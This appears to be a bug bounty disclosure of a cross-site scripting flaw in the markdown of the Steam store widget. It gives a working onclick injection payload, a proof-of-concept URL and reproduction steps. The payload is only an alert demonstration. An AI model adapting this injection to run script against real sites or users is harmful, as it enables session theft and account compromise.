## Vulnerability Information
Hello guys
I found an xss vulnerability on store.steampowered.com markdown

#POC
http://store.steampowered.com/widget/386360/?t=[url=google.com:/onclick=%27alert(document.domain)%27[url=]]xss[/url]

#Here is my exploit
```
[url=google.com:/onclick='alert(document.domain)'[url=]]xss[/url]
```
#Steps
1 - go to any product
2 - click embed
3 - The markdown for widgets area is vulnerable
{F261131}
4: http://store.steampowered.com/widget/386360/?t=[url=google.com:/onclick=%27alert(document.domain)%27[url=]]xss[/url]
{F261134}

My research was only limited on the widgets area I'm not totally sure if other markdown that is using [url=site.com] are vulnerable also. I will continue my research for this coz I believe it has some other area that are still affected by this issue.

Cheers
